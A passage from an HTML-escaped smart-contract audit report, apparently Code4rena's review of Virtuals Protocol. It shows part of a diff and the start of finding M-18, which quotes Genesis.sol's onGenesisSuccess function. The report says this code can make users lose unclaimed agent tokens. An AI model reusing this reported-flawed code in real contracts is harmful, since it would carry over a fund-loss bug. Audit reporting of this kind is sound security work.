reentrancy\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _earlyExecutions[proposalId] = true;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-       _executeOperations(proposalId, targets, values, calldatas, descriptionHash);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       execute(targets, values, calldatas, descriptionHash);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit ProposalExecuted(proposalId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return proposalId;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first\" style=\"position:relative;\"\u003e\u003ca href=\"#m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first\" aria-label=\"m 18 genesissolongenesissuccess users may lose their unclaimed agenttokens if a second launch occurs before theyve claimed their rewards from the first permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-114\"\u003e[M-18] \u003ccode\u003eGenesis.sol:onGenesisSuccess()\u003c/code\u003e users may lose their unclaimed \u003ccode\u003eagentTokens\u003c/code\u003e if a second launch occurs before they’ve claimed their rewards from the first\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-66\"\u003eFitro\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-705\"\u003edreamcoder\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L205-L304\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L205-L304\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-5\" aria-label=\"finding description and impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eonGenesisSuccess()\u003c/code\u003e is used to refund virtual tokens to users and to account for the agent tokens earned by participating in a successful genesis event.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonGenesisSuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecreator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFACTORY_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewhenNotCancelled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewhenNotFailed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewhenEnded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//code...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if launch has been called before\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisFirstLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Calculate required balance based on whether this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erequiredVirtualsBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisFirstLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalRefundAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserveAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e : \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalRefundAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if contract has enough virtuals balance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erequiredVirtualsBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient Virtual Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Only do launch related operations if this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisFirstLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// grant allowance to agentFactoryAddress for launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactoryAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserveAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call initFromBondingCurve and executeBondingCurveApplication\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactoryAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitFromBondingCurve\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econcat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisName\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot; by Virtuals\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisTicker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisCores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaSalt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoVotingPeriod\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserveAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecreator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactoryAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteBondingCurveApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenLpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// vault\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Agent token creation failed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Store the created agent token address\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Calculate total distribution amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalDistributionAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalDistributionAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan 